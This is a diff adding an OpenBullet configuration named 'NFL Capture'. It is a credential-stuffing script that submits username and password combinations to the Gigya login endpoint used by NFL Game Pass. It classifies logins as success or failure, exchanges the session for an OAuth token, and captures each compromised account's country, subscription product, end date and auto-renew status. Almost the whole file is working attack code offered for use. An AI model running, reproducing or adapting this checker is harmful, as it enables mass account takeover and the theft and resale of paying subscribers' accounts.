@@ -1,0 +1,106 @@
+[SETTINGS]
+{
+  "Name": "NFL Capture",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-11-17T16:58:01.1148195+01:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://accounts.us1.gigya.com/accounts.login" 
+  CONTENT "loginID=<USER>&password=<PASS>&sessionExpiration=0&targetEnv=jssdk&include=profile%2Cdata&includeUserInfo=true&lang=en&APIKey=3_EH6cZ6gBJgl94hXqcCex1M71QN8eHd9G-3a5wKNqPihlX1-WTim-URKv0vym4xKp&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.nflgamepass.com%2Fen&format=jsonp&callback=gigya.callback&context=R163785901&utf8=%26%23x2713%3B" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: accounts.us1.gigya.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://cdns.us1.gigya.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: nested-navigate" 
+  HEADER "Referer: https://cdns.us1.gigya.com/gs/webSdk/Api.aspx?apiKey=3_EH6cZ6gBJgl94hXqcCex1M71QN8eHd9G-3a5wKNqPihlX1-WTim-URKv0vym4xKp&version=latest" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fr-TN;q=0.8,fr;q=0.7,ar;q=0.6" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorDetails" 
+  KEYCHAIN Success OR 
+    KEY "registeredTimestamp" 
+    KEY "login_token" 
+
+PARSE "<SOURCE>" LR "country\": \"" "\"" -> CAP "Country" 
+
+PARSE "<SOURCE>" LR "created\": \"" "\"" -> CAP "Created" 
+
+PARSE "<SOURCE>" LR "UID\": \"" "\"" -> VAR "UID" 
+
+PARSE "<SOURCE>" LR "UIDSignature\": \"" "\"" -> VAR "UIDSignature" 
+
+PARSE "<SOURCE>" LR "signatureTimestamp\": \"" "\"" -> VAR "signatureTimestamp" 
+
+REQUEST POST "https://www.nflgamepass.com/api/user/oauth/token" 
+  CONTENT "client_id=42cc360e-6fbb-4472-9437-2f088b8730de&device_type=web&device_description=Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/71.0.3578.98%20Safari/537.36&username=<USER>&uuid=<UID>&signature=<UIDSignature>&ts=<signatureTimestamp>&grant_type=shield_authentication" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "access_token\":\"" "\"" -> VAR "access_token" 
+
+REQUEST GET "https://www.nflgamepass.com/api/user/api/users/v1/subscription/myaccount" 
+  
+  HEADER "Authorization: Bearer <access_token>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"subscriptions\":[]" 
+
+PARSE "<SOURCE>" LR "subscriptions\":[{\"productTag\":\"" "\"" -> CAP "currentSubscription" 
+
+PARSE "<SOURCE>" JSON "endDate" -> CAP "endDate" 
+
+PARSE "<SOURCE>" JSON "isAutorenew" -> CAP "isAutorenew" 
+
